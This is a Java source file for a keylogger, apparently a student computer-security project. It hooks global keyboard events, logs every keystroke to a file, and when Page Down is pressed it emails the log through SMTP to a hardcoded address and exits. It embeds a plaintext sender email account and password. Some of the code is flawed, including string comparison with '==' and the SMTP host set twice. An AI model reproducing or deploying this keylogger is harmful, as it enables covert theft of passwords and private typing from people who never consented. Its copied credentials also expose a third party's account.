// imports that help listen to keystrokes
import org.jnativehook.*;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
// imports that help write into a file
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.Properties;
// imports for sending email
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.InternetAddress;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.Message;
import javax.mail.Multipart;

public class KeyLogger implements NativeKeyListener {
    // stores the path to the file where the keystrokes will be logged.
    private static final Path file = Paths.get("Keys.txt");

    // main function
    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();

        }
        // setup the keylogger so it can be notified of kkey presses
        GlobalScreen.getInstance().addNativeKeyListener(new KeyLogger());
    }

    // functionality when code detects key press
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        // get the text of the button pressed i.e. (space)
        String keytext = NativeKeyEvent.getKeyText(e.getKeyCode());
        // this line will append any of the output data into the existing file
        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
            // if the keytext variable is greater than one character long, the text is enclosed in brackets, this ensure that it is known it is a special key
            // if the keytext variable is equal to the "Enter" key, a newline character is written to the file
            // if the keytext variable is equal to the "Page Down" key, the program exits and sends an email
            if (keytext.length() > 1) {
                writer.print("[" + keytext + "]");
            } else {
                writer.print(keytext);
            } if (keytext == "Enter") {
                writer.println();
            } else if (keytext == "Page Down") {
                sendEmail("owentg213@gmail.com", file);
                System.exit(0);
            }
        // catch exceptions i cant use e cos its already used in the override D; (i hate this)
        } catch (IOException exception) {
            throw new RuntimeException(exception);
        }

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
    }

    // function that sends an email and attaches file
    private void sendEmail(String emailAddress, Path file) {
        try {
            // create new email session
            Properties props = new Properties();
            props.put("mail.smtp.host", "smtp.gmail.com");
            props.put("mail.smtp.host", "smtp.outlook.com");
            props.put("mail.smtp.socketFactory.port", "587");
            props.put("mail.smtp.auth", "true");
            props.put("mail.smtp.starttls.enable", "true");
            
            Session session = Session.getInstance(props, new javax.mail.Authenticator() {
                protected javax.mail.PasswordAuthentication getPasswordAuthentication() {
                    return new javax.mail.PasswordAuthentication("compsecowen@outlook.com", "lolmanok1@");
                }
            });

            // create new email message
            MimeMessage message = new MimeMessage(session);

            // set sender and recipient email addresses
            InternetAddress from = new InternetAddress("compsecowen@outlook.com");
            InternetAddress to = new InternetAddress(emailAddress);
            message.setFrom(from);
            message.addRecipient(Message.RecipientType.TO, to);

            // set email subject
            message.setSubject("Keystrokes log");

            // create MimeBodyPart object for file attachment
            MimeBodyPart attachment = new MimeBodyPart();
            attachment.attachFile(file.toFile());

            // create a multipart message and attach file
            Multipart multipart = new MimeMultipart();
            multipart.addBodyPart(attachment);

            // set message content to the multipart message
            message.setContent(multipart);

            // send
            Transport.send(message);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}